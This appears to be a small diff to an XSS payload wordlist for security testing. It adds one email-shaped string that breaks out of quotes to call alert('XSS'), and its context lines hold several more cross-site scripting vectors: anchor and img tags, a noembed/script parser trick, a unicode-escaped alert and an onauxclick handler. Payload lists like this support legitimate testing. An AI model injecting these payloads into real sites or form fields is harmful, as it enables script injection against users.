@@ -1,6 +1,7 @@
 <a/href="/alert(1)/">
 <a/href="/prompt(1)/"<
 <img/src="/prompt(1)/"<
+["');alert('XSS');//"]@xyz.xxx
 <select><noembed></select><script x='a@b'a>
 y='a@b'//a@b%0a\u0061lert(1)</script x>
 <d3v/onauxclick=(((alert)))``>click
